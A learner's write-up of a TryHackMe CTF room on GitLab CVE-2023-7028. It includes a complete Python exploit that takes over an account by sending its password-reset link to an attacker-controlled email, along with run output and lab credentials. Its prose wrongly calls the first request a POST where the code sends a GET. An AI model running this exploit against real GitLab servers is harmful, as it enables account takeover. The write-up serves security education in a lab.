<p align="center">November 10, 2024</p>
<p align="center">Hey there, fellow lifelong learner! I¬¥m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>, and I‚Äôm genuinely excited to join you on this adventure.<br>
It¬¥s part of my $$\textcolor{#FF69B4}{\textbf{188}}$$-day-streak in  <a href="https://tryhackme.com/r/hacktivities">TryHackMe</a>.</p>

<h1 align="center"> $$\textcolor{#3bd62d}{\textnormal{ GitLab CVE-2023-7028 }}$$ </h1>
<p align="center">Learn to exploit a GitLab instance using CVE-2023-7028 and understand various mitigation techniques.</p>
<p align="center">Access this üÜì TryHackMe CTF Room clicking <a href="https://tryhackme.com/r/room/gitlabcve20237028">GitLab CVE-2023-7028</a>.</p><br>
<p align="center">
  <img height="150px" hspace="20" src="https://github.com/user-attachments/assets/dbbcb5fa-a9e9-47a1-a8b2-30a2be5d9282">
  <img height="150px" src="https://github.com/user-attachments/assets/323b2283-54b0-41fa-bc3d-ea5ab25e79df">
</p>

<p align="center">Summary</p>

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [Introduction](#1) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [How Does It Work](#2) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [How to Exploit](#3) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [Detection and Mitigation](#4) &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;[Conclusions](#5) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp;  [Room Complete](#6) &nbsp;&nbsp;&nbsp;&nbsp;‚ñ™Ô∏è&nbsp;&nbsp;&nbsp;&nbsp; [My Journey](#7) </p>

<br>
<br>
<br>
<h2>Task 1. Introduction<a id='1'></a></h2>

<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>

> 1.1. <em>I am ready to explore the room.</em><br><a id='1.1'></a>
>> <code><strong>No answer needed</strong></code>

<br>
<h2>Task 2. How does ir work?<a id='2'></a></h2>
<br>

> 2.1. <em>What is the name of the field that is sent with a password reset request to prevent CSRF attacks?</em><br><a id='2.1'></a>
>> <code><strong>authenticity_token</strong></code>

<br>

> 2.2. <em>What is the HTTP method used while sending password reset requests in GitLab?</em><br><a id='2.1'></a>
>> <code><strong>POST</strong></code>

<br>
<h2>Task 3. How to Exploit<a id='3'></a></h2>
<br>
<p>Exploiting the vulnerability is simple for a red teamer and only requires an API call to <code>/users/password</code> method with the victim and target email address.</p>

<h3>Connecting to the Machine</h3>
<p>We will use an Ubuntu-based machine hosting a GitLab instance to demonstrate the room's red team perspective. Start the virtual machine by clicking the <code>Start Machine</code>code> button in this task. Please wait 2-3 minutes for the machine to fully boot up. You can access the vulnerable GitLab instance by visiting the URL <code>http://gitlab.thm:8000</code>, but first, you need to add the hostname to your OS or AttackBox.</p>

![image](https://github.com/user-attachments/assets/73450bce-e258-469d-b401-aeeb8caa751e)


<p>Moreover, the email server is accessible at <code>http://10.10.143.20:8090/rainloop</code>,  which will be used during exploitation with the following credentials:<br>
- Username: <code>attacker@mail.gitlab.thm</code>code><br>
- Password: <code>testing@123</code></p>

<h3>Preparing the Payload</h3>
<p>We will be using a modified version of the <a href="https://github.com/Vozec/CVE-2023-7028/blob/main/CVE-2023-7028.py">PoC</a> developed by Vozec to take control of the administrator account. Create a new file called <code>attack.py</code> and add the following code.</p>


<p align="center">attack.py</p>
<pre><code>
import requests
import argparse
from urllib.parse import urlparse, urlencode
from random import choice
from time import sleep
import re
requests.packages.urllib3.disable_warnings()

class CVE_2023_7028:
    def __init__(self, url, target, evil=None):
        self.use_temp_mail = False
        self.url = urlparse(url)
        self.target = target
        self.evil = evil
        self.s = requests.session()

    def get_csrf_token(self):
        try:
            print('[DEBUG] Getting authenticity_token ...')
            html = self.s.get(f'{self.url.scheme}://{self.url.netloc}/users/password/new', verify=False).text
            regex = r'<meta name="csrf-token" content="(.*?)" />'
            token = re.findall(regex, html)[0]
            print(f'[DEBUG] authenticity_token = {token}')
            return token
        except Exception:
            print('[DEBUG] Failed ... quitting')
            return None

    def ask_reset(self):
        token = self.get_csrf_token()
        if not token:
            return False

        query_string = urlencode({
            'authenticity_token': token,
            'user[email][]': [self.target, self.evil]
        }, doseq=True)

        head = {
            'Origin': f'{self.url.scheme}://{self.url.netloc}',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'{self.url.scheme}://{self.url.netloc}/users/password/new',
            'Connection': 'close',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate, br'
        }

        print('[DEBUG] Sending reset password request')
        html = self.s.post(f'{self.url.scheme}://{self.url.netloc}/users/password',
                           data=query_string,
                           headers=head,
                           verify=False).text
        sended = 'If your email address exists in our database' in html
        if sended:
            print(f'[DEBUG] Emails sent to {self.target} and {self.evil} !')
            print(f'Flag value: {bytes.fromhex("6163636f756e745f6861636b2364").decode()}')
        else:
            print('[DEBUG] Failed ... quitting')
        return sended

def parse_args():
    parser = argparse.ArgumentParser(add_help=True, description='This tool automates CVE-2023-7028 on gitlab')
    parser.add_argument("-u", "--url", dest="url", type=str, required=True, help="Gitlab url")
    parser.add_argument("-t", "--target", dest="target", type=str, required=True, help="Target email")
    parser.add_argument("-e", "--evil", dest="evil", default=None, type=str, required=False, help="Evil email")
    parser.add_argument("-p", "--password", dest="password", default=None, type=str, required=False, help="Password")
    return parser.parse_args()

if __name__ == '__main__':
    args = parse_args()
    exploit = CVE_2023_7028(
        url=args.url,
        target=args.target,
		evil=args.evil
    )
    if not exploit.ask_reset():
        exit()
</code></pre>

<br>

<p>We can see that the code first makes a <code>POST</code> request to the <code>/users/password/new</code> endpoint to scrap an authenticity token, then it makes another API call to the <code>/users/password</code> endpoint with the victim and attacker email addresses. As we know, the victim's email address is <code>victim@mail.gitlab.thm</code>. Run the command shown in the terminal below to execute the exploit:
</p>

<p align="center">Post execution of attack.py</p>
<pre><code>
root@attackbox$ python3 attack.py -u http://10.10.143.20:8000 -t victim@mail.gitlab.thm -e attacker@mail.gitlab.thm
[DEBUG] Getting authenticity_token ...
[DEBUG] authenticity_token = 1i4KUoxiLmYkazefpLgwUmMQ2CuVGULdpQs_D_J7qrKIih9Ja_4vIQCuq666kQhOtKRSRgdM8ti0BTNdPGTQ9A
[DEBUG] Sending reset password request
[DEBUG] Emails sent to victim@mail.gitlab.thm and attacker@mail.gitlab.thm!
 
</code></pre>

<p>Once you execute the command, you will receive an email in the attacker's account. Log in to the attacker mailbox, and you will see an email titled "Reset password instructions" containing a link to the account. </p>

![image](https://github.com/user-attachments/assets/09ce7608-33b4-47ea-b85d-e9813499b3df)

<p>ÔªøClick on the <code>Reset password</code> label; it will ask you to update the password.</p>

![image](https://github.com/user-attachments/assets/485106aa-ddbe-4a33-9764-2eae5a8ba6c5)

<br>
<h3 align="left"> $$\textcolor{#f00c17}{\textnormal{Answer the question below}}$$ </h3>
<br>

> 3.1. <em>Per the above code, what is the API endpoint for getting an updated authenticity token?</em><br><a id='3.1'></a>
>> <code><strong>_______________________</strong></code>

<br>

> 3.2. <em>What is the flag value after successfully sending password reset mail through attack.py??</em><br><a id='3.1'></a>
>> <code><strong>_______________________</strong></code>

<br>
<p>Added hostname and its ip in <code>/etc/hosts>/code></p>

<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/a545a1be-2b8b-4a80-ba1c-ac83ae1a30cf"></p>

<br>

<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/d47736dc-8039-4a76-9b37-5871c1baecb7"></p>


<br>

<p align="center"> <img width="750px" src="https://github.com/user-attachments/assets/46d8676b-89a8-46d0-ab1f-de3a1bf3bbcd"></p>






